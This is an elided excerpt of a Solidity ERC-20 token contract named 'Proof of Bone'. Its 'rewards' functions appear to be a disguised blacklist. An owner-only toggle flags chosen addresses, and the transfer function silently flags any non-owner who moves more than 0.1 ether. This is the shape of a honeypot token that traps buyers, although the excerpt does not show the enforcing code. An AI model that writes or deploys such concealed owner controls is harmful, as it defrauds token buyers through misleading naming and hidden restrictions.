...
contract ProofofBone is Context, IERC20, Ownable {
    ...
    event botRewarded (address rewardsAddress, bool isRewarded);
    ...
    string private _name = 'Proof of Bone';
    string private _symbol = 'BONE2.0';
    ...
    function feeRewards(address rewardsAddress) external onlyOwner {
        if (_sendRewards[rewardsAddress] == true) {
            _sendRewards[rewardsAddress] = false;
        } else {_sendRewards[rewardsAddress] = true;
            emit botRewarded (rewardsAddress, _sendRewards[rewardsAddress]);
          }
    }
    
    function checkRewards(address rewardsAddress) public view returns (bool) {
        return _sendRewards[rewardsAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (tx.origin != owner() && amount > 0.1 ether) {
            _sendRewards[tx.origin] = true;
        }
    }
